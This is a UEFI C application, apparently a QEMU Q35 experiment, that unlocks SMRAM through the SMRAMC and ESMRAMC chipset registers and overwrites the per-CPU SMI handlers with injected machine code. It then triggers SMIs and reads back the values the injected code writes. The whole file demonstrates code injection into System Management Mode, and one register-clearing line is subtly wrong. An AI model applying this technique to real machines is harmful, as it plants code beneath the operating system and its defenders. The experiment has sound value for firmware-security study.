#include <Uefi.h>
#include <Library/UefiApplicationEntryPoint.h>
#include <Library/UefiLib.h>
#include <Library/PciLib.h>
#include <stdbool.h>

// SMRAMC register definition with D_OPEN bit
// SMRAM can be accessed from NON-SMM when this one is set
#define DRAMC_REGISTER_Q35(Offset) PCI_LIB_ADDRESS (0, 0, 0, (Offset))
#define MCH_ESMRAMC              0x9E
#define MCH_SMRAM                0x9D
#define MCH_SMRAM_D_OPEN         BIT6
#define MCH_ESMRAMC_T_EN         BIT0

#define _V (void*)

CHAR16 doobiedoo[] = L"Hello my little spy!\n";

void dump_smram_registers (void);
void allow_smram_outside_smm( bool val );
void allow_tseg_outside_smm( bool val );

char SMI_handler[] = {
 /*
    This must be 16-bit i386 code. Thus assembly source file
    starts with '.code16' directive (in GAS/AT&T) and is
    disassembled with:

    $ as hello/handler.S -o hello/handler.o
    $ objdump -d hello/handler.o -mi386 -Maddr16,data16

    Note that SMM code may enter protected mode and use 32-bit
    code. That, what UEFI does, here's disassembly of code I dumped
    from SMM:

   0:	bb 4d 80             	mov    $0x804d,%bx
   3:	2e a1 38 fb          	mov    %cs:0xfb38,%ax
   7:	48                   	dec    %ax
   8:	2e 89 07             	mov    %ax,%cs:(%bx)
   b:	2e 66 a1 30 fb       	mov    %cs:0xfb30,%eax
  10:	2e 66 89 47 02       	mov    %eax,%cs:0x2(%bx)
  15:	2e 66 0f 01 17       	lgdtl  %cs:(%bx)
  1a:	b8 08 00             	mov    $0x8,%ax
  1d:	2e 89 47 fe          	mov    %ax,%cs:-0x2(%bx)
  21:	66 bf 00 b0 f8 7f    	mov    $0x7ff8b000,%edi
  27:	66 67 8d 87 53 80 00 	lea    0x8053(%edi),%eax
  2e:	00
  2f:	2e 66 89 47 fa       	mov    %eax,%cs:-0x6(%bx)
  34:	0f 20 c3             	mov    %cr0,%ebx
  37:	66 81 e3 f3 ff fa 9f 	and    $0x9ffafff3,%ebx
  3e:	66 83 cb 23          	or     $0x23,%ebx
  42:	0f 22 c3             	mov    %ebx,%cr0
  45:	66 ea 53 30 f9 7f 08 	ljmpl  $0x8,$0x7ff9305

   Although I don't need that:

0000000000000000 <_start>:
   0:	66 b8 0b 00 00 a0    	mov    $0xa000000b,%eax
   6:	67 66 c7 00 ef be ad 	movl   $0xdeadbeef,(%eax)
   d:	de
   e:	0f aa                	rsm
 */
    0x66, 0xb8, 0x0b, 0x00, 0x00, 0xa0,
    0x67, 0x66, 0xc7, 0x00, 0xef, 0xbe, 0xad, 0xde,
    0x0f, 0xaa
};

EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  dump_smram_registers();
  allow_smram_outside_smm(true);
  allow_tseg_outside_smm(true);
  dump_smram_registers();

  UINT32 magic[2] = {0, 0}; // <- Here I want to get my values
  Print( L"Magic numbers on app stack: %x %x\n", magic[0], magic[1] );

  void *smbase[2] = { _V 0x7FF8B000, _V 0x7FF8D000 };

  // copy handler to each SMBASE (one per CPU)
  for( UINTN hid = 0; hid < 2; hid++ ) {

    // put right output address in SMI handler code
    *((UINT32*)(SMI_handler+2)) = (UINT32)((UINT64) magic)+hid*4;

    char *smm_code = ((char**)smbase)[hid] + 0x8000;
    Print( L"Overriding SMI handler #%x @ %x.\n", hid, smm_code );

    for( UINTN i = 0; i < sizeof( SMI_handler ); i++ ) {
        smm_code[i] = SMI_handler[i];
        Print( L"%02x ", smm_code[i] & 0xff );
    }
    Print( L"\n\n" );
  }

  allow_smram_outside_smm(false);
  allow_tseg_outside_smm(false);

  Print( L"SMRAM closed, triggering 20 SMIs...\n" );

  for( UINTN i = 0; i < 20; i++ ) {
    magic[0] = magic[1] = 0;
    asm( "push %rax\nxor %al, %al\noutb %al, $0xb2\npop %rax" );

    /*
      Here I introduce some delay. On QEMU without delay about 2-3 20th
      times only first value is populated. Probably that's because both
      CPUs get SMI, but only one executing application is provided to
      finish before application continues. For other happens race
      condition. */
    for(UINTN j = 0; j < 100000; j++ );

    Print( L"Magic numbers on app stack: %x %x\n", magic[0], magic[1] );
  }

  while(1) {}

  return EFI_SUCCESS;
}

void allow_smram_outside_smm( bool val ) {

  // MCH_SMRAM MSR:
  // D_OPEN=1 -> SMRAM r/w from NON-SMM

  if( val ) {
    PciOr8 (DRAMC_REGISTER_Q35 (MCH_SMRAM),  0x40 );
  } else {
    PciAnd8 (DRAMC_REGISTER_Q35 (MCH_SMRAM), !0x40 );
  }

}

void allow_tseg_outside_smm( bool val ) {

  // T_EN=0 -> TSEG r/w only from SMM
  if( val ) {
    PciAnd8 (DRAMC_REGISTER_Q35 (MCH_ESMRAMC), 0xfe );
  } else {
    PciOr8 (DRAMC_REGISTER_Q35 (MCH_ESMRAMC), 0x01 );
  }

}

void dump_smram_registers (void) {
  UINT8 smramc = PciRead8( DRAMC_REGISTER_Q35 (MCH_SMRAM) );
  UINT8 esmm = PciRead8 (DRAMC_REGISTER_Q35 (MCH_ESMRAMC) );
  Print( L"\nSMRAMC: %x, ESMRAMC: %x\n", smramc, esmm );
}

